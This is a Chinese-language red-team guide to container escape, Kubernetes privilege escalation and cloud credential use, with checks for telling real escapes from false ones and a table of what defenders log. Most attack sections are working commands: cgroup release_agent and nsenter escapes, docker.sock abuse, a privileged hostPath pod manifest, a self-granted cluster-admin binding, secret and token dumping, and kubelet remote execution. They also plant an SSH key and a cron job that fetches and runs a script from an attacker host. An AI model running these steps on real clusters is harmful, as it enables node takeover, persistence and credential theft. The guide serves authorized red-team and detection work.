# 容器逃逸与 Kubernetes 提权：判据、验伤与假成功

> 本文是 `cloud-k8s` 的深水区。技能正文给的是「怎么开始」，这篇给的是
> **「打到了没」「看起来打到了其实是假的」「防守方在日志里看到什么」**。
>
> 容器逃逸是红队最容易被自己骗的一类：`docker run --privileged` 拿到宿主机文件系统
> 不代表能执行宿主命令；`kubectl exec` 成功不代表拿到的是目标 namespace。
> 下文每条都标出「验伤信号」，缺了它就别在报告里写「已逃逸」。

---

## 一、先定坐标：你现在到底在哪一层

写任何命令之前先跑这三条，回答「我在容器里、在节点上、还是在控制面」：

```bash
# ① 是不是容器？cgroup 路径最可靠（/proc/1/cgroup 在 cgroup v2 上可能只有 0::/）
cat /proc/1/cgroup
cat /proc/self/mountinfo | grep -E "docker|containerd|kubepods|overlay" | head -5
[ -f /.dockerenv ] && echo "docker"; [ -f /run/.containerenv ] && echo "podman"

# ② 是 K8s Pod 吗？看 SA token 与环境变量
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
env | grep -E "KUBERNETES_|HOSTNAME"

# ③ 宿主机的内核版本与能力（决定了哪些逃逸路可走）
uname -a; capsh --print 2>/dev/null | head -20 || grep Cap /proc/self/status
```

**验伤信号（怎么确认自己真在容器里）**：

| 观察 | 结论 | 注意 |
| --- | --- | --- |
| `/proc/1/cgroup` 含 `kubepods` | 在 K8s Pod 内 | cgroup v2 可能只显示 `0::/`，**不能据此断定不在容器** |
| 有 `/.dockerenv` | Docker 容器 | 无此文件**不等于**不是容器（containerd 不建） |
| `mountinfo` 根挂载是 `overlay` | 容器 rootfs | `--privileged` 时可能直接是宿主块设备 |

**常见假信号**：只看到 `overlay` 就写「确认在容器内」。宿主机上跑 Docker 的进程
其子进程也会看到 overlay 挂载点 —— 要结合 cgroup 与 SA token 一起判。

---

## 二、`--privileged` / `CAP_SYS_ADMIN`：最常见的逃逸口

判据：容器有 `CAP_SYS_ADMIN`，或 `/dev` 下有宿主块设备。

```bash
# 检查能力
grep CapEff /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')

# 路径 A：cgroup release_agent（cgroup v1 有效，v2 已移除该机制）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat > /tmp/cmd <<'EOF'
#!/bin/sh
id > /tmp/escaped.txt
EOF
chmod +x /tmp/cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/escaped.txt
```

**验伤信号**：`/tmp/escaped.txt` 里的 `id` 输出是 **uid=0(root) 且宿主机的 hostname**。
如果只看到文件存在但内容是空 —— 说明 `release_agent` 没执行（多半是 cgroup v2），
**不要把「创建了文件」当成「逃逸成功」**。

**cgroup v2 上这条路死了**，改用：

```bash
# 路径 B：挂载宿主 rootfs（有 CAP_SYS_ADMIN + 宿主块设备可见）
lsblk
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host        # 换成真实宿主分区
ls /mnt/host/etc/shadow          # 能看到宿主 shadow = 真逃逸
```

```bash
# 路径 C：nsenter 进宿主命名空间（需要宿主 PID 可见 + CAP_SYS_PTRACE 或 privileged）
nsenter -t 1 -m -u -i -n -p -- /bin/sh
# 更稳：先找宿主的 pid（容器内 PID 1 常是自己的 init，宿主的在 /proc 里能看到更大 pid）
ps -ef | head -20
nsenter -t <host_pid> -m -p -- /bin/sh
```

**验伤信号**：`nsenter` 成功后会看到**宿主机的完整进程树**（几百个进程、含 kubelet/containerd）。
只看到自己容器的 3-5 个进程 = 进的是容器命名空间，不是宿主。

---

## 三、挂载类逃逸（不用 privileged 也常见）

| 挂载形态 | 逃逸手法 | 验伤 |
| --- | --- | --- |
| `/var/run/docker.sock` 挂进容器 | `docker run -v /:/host --privileged` 起新容器 | 新容器内 `ls /host` 能看到宿主根 |
| `/proc` 以 rw 挂载 | 改 `/proc/sys/kernel/core_pattern` 触发 | 写完后 `cat /proc/sys/kernel/core_pattern` 确认生效 |
| 宿主目录以 rw 挂载（如 `/etc`） | 直接改宿主 `/etc/cron.d` 或 sshd 配置 | 宿主上真出现你的文件 |
| `/dev/kmsg` 可写 | 写内核消息（噪音大，少用） | `dmesg` 能看到 |

```bash
# docker.sock 判定
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock ps     # 能列出宿主所有容器 = 已控宿主 Docker
# 逃逸
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host /bin/sh
```

**常见坑**：`docker ps` 只列出**一个**容器（就是你自己）时，说明这是 podman/dockerd 的
本地 socket 但权限受限 —— 不代表能起容器。要 `docker run` 试一次才算。

---

## 四、Kubernetes 提权：从 Pod 到 cluster-admin

### 4.1 先看手里有什么

```bash
# SA token 的权限（最重要的一步，别背 RBAC 表）
kubectl auth can-i --list
# 没 kubectl 时直接打 API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://kubernetes.default.svc
curl -sk -H "Authorization: Bearer $TOKEN" $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"spec":{"namespace":"default"}}' | jq '.status.resourceRules'
```

### 4.2 六条常见提权路（按命中率排序）

**① 挂载 hostPath 的 Pod** —— 只要 Pod 挂了 `/` 或 `/var/lib/kubelet`：

```bash
# 在 Pod 内直接写节点文件
ls /host 2>/dev/null || ls /var/lib/kubelet
echo 'ssh-rsa AAAA...' >> /host/root/.ssh/authorized_keys
# 或写 cron
echo '* * * * * root /bin/bash -c "curl http://ATTACKER/x|sh"' > /host/etc/cron.d/pwn
```

**验伤**：节点上 `ls /root/.ssh/authorized_keys` 出现你的公钥，或 cron 真触发。
**假成功**：`/host` 存在但 `ls` 报 Permission denied —— 说明挂的是只读或非 root uid，别写「已控制节点」。

**② 有 `create pods` 权限** —— 起一个挂宿主根的 Pod：

```yaml
apiVersion: v1
kind: Pod
metadata: { name: pwn }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","sleep 3600"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: h, mountPath: /host }]
  volumes: [{ name: h, hostPath: { path: / } }]
```

```bash
kubectl apply -f pwn.yaml && kubectl exec -it pwn -- chroot /host /bin/bash
```

**③ 有 `create clusterrolebinding` 权限** → 直接给自己 cluster-admin（最快）：

```bash
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=default:default
kubectl auth can-i '*' '*'   # 应回 yes
```

**④ 能读 Secret** → 挖其他 SA 的 token 或云凭据：

```bash
kubectl get secrets -A
kubectl get secret <name> -o jsonpath='{.data.token}' | base64 -d
```

**⑤ 有 `pods/exec` 或能改 Deployment** → 横向到有更高权限的 Pod。

**⑥ 节点级：kubelet 10250 未授权**（不依赖 K8s RBAC）：

```bash
curl -sk https://<node-ip>:10250/pods
curl -sk https://<node-ip>:10250/run/<ns>/<pod>/<container> -d "cmd=id"
```

**验伤**：`/pods` 返回 JSON 列表（不是 401/403）；`/run` 回显能执行 `id`。

---

## 五、云侧：凭据到手之后

元数据拿到临时凭据（`AccessKeyId/SecretAccessKey/Token`）后，**三步确认是不是真能用**：

```bash
# ① 确认身份（最关键 —— 别在打自己账号）
AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws sts get-caller-identity
# ② 列权限（只读动作，安全）
aws iam list-attached-user-policies --user-name <name> 2>/dev/null
aws iam list-role-policies --role-name <role> 2>/dev/null
# ③ 试探关键动作（能过再往下）
aws s3 ls
aws ec2 describe-instances --max-items 1
```

**必踩的坑**：

| 现象 | 真实原因 | 处理 |
| --- | --- | --- |
| `InvalidClientTokenId` | key 是对的但**区域/服务不对**，或 key 已过期 | 先看 token 的 `Expiration` |
| `AccessDenied` 但身份对 | 权限确实没开 | 换角色，别硬试（会触发告警） |
| S3 能列但读不了对象 | 桶策略允许 ListBucket 不给 GetObject | 正常，记录权限边界即可 |
| 阿里云/腾讯云报签名错 | 用的是 v1 签名，需要 v3/v4 | 更新 CLI 或手工算签名 |

**别做的事**：拿到凭据就 `aws ec2 run-instances` 或 `s3 rm`。
红队作业里这类写操作会造成真实破坏，且极易触发 SOAR 自动响应。

---

## 六、检测视角：防守方看到什么

这一节是为了**让你知道动作会不会被抓**，也让报告能写「本动作的检测覆盖」。

| 动作 | 日志/事件 | 典型告警 |
| --- | --- | --- |
| 元数据访问 | CloudTrail `GetCredentialData`、IMDS 访问日志（若开） | GuardDuty `UnauthorizedAccess:EC2/MetadataService` |
| 用临时凭据调 API | CloudTrail 里 `userIdentity.type=AssumedRole` + 异常源 IP | GuardDuty `Recon:IAMUser/MaliciousIPCaller` |
| `create clusterrolebinding` | K8s audit log `verb=create resource=clusterrolebindings` | Falco / kube-audit 规则「权限提升」 |
| `hostPath: /` 的 Pod | audit log `hostPath.path=/` | OPA/Kyverno 准入策略直接拒绝 |
| `nsenter` / `chroot /host` | 节点上的 `execve`（Falco） | Falco `Terminal shell in container`、`Container escape` |
| 读 SA token 打 API | audit log `user.username=system:serviceaccount:*` 的高危 verb | 多数环境只审计不告警 —— **要记录这一点** |

**报告写法**：不要写「本动作无检测」。写「检测覆盖：K8s audit 有 `create clusterrolebinding` 记录
（verb/resource 级），未见针对 SA token 滥用的告警规则」。前者是猜，后者是观察。

---

## 七、自检清单（逃逸前必须逐条过）

```text
□ 我在哪一层？（cgroup + mountinfo + SA token 三件一起看）
□ 有 CAP_SYS_ADMIN / privileged 吗？（CapEff 解码）
□ 挂进来的敏感路径有哪些？（mountinfo 里 grep host/socket/proc）
□ 手里 SA 的真实权限？（selfsubjectrulesreviews，别背表）
□ 云凭据真能用吗？（sts get-caller-identity 过了才算）
□ 逃逸后怎么证明？（宿主 shadow / 宿主进程树 / 节点上的我的文件，三选一必须具体）
□ 这条动作的检测覆盖是什么？（写观察到的，不写"无"）
```

**最后一条最容易忘**：报告里「已逃逸到节点」必须附一个**只有真逃逸才可能有的证据**。
`cat /etc/hostname` 这种容器和宿主都可能一样，不算证据。